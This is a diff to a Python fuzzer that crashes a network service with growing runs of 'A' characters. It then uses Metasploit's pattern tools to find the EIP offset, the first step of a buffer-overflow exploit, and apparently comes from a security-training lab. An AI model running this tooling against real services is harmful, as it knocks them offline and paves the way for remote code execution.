@@ -1,7 +1,11 @@
 #!/usr/bin/python3.9
 
+# basic use of this script, find the command to fuzz then let it run till crash
+# let it use the metasploit framework tool to make a string for it to crash with again
+# after that crash enter the characters within the eip and it will provide the offset
+
 import socket
-import sys
+import subprocess
 import argparse
 from time import sleep
 
@@ -57,7 +61,7 @@ def fuzzer(command):
     fine_fuzzing = True
     while rough_fuzzing:
         try:
-            crash = crash + 'A'*100
+            crash = crash + 'A'*300
             payload = ''.join([command, ' ', crash])
             s,connection = connection_init()
             send_message(s, payload)
@@ -65,7 +69,7 @@ def fuzzer(command):
             buffer = crash
             sleep(1)
         except:
-            print('Crashed between %d and %d bytes' % (len(buffer), len(crash)))
+            print('Crashes between %d and %d bytes' % (len(buffer), len(crash)))
             rough_fuzzing = False
             cont = input('Restart the server then hit enter to continue.')
     
@@ -75,26 +79,23 @@ def fuzzer(command):
     send_message(s, test)
     print(s.recv(1024).decode())
 
-    while fine_fuzzing:
-        try:
-            payload = ''.join([command, ' ', buffer])
-            print(len(buffer))
-            s,connection = connection_init()
-            send_message(s, payload)
-            buffer = buffer + 'A'
-            sleep(2)
-        except:
-            print('The buffer size is %d' % (len(buffer)-2))
-            fine_fuzzing = False
-    return buffer
+    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb'
+    arg1 = '-l'
+    arg2 = str(len(crash))
+    offset_pattern = subprocess.run([script, arg1, arg2], capture_output=True)
+    print(offset_pattern.stdout.decode())
+    payload = ''.join([command, ' ', offset_pattern.stdout.decode()])
+    send_message(s, payload)
 
-
-
-def auto():
-    return
+    script = '/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb'
+    arg3 = '-q'
+    eip_chars = input('Enter the characters in the EIP after the crash: ')
+    offset_find = subprocess.run([script, arg1, arg2, arg3, eip_chars], capture_output=True)
+    print(offset_find.stdout.decode())
 
 
 if __name__ == '__main__':
+
     s,connection = connection_init()
 
     while connection:
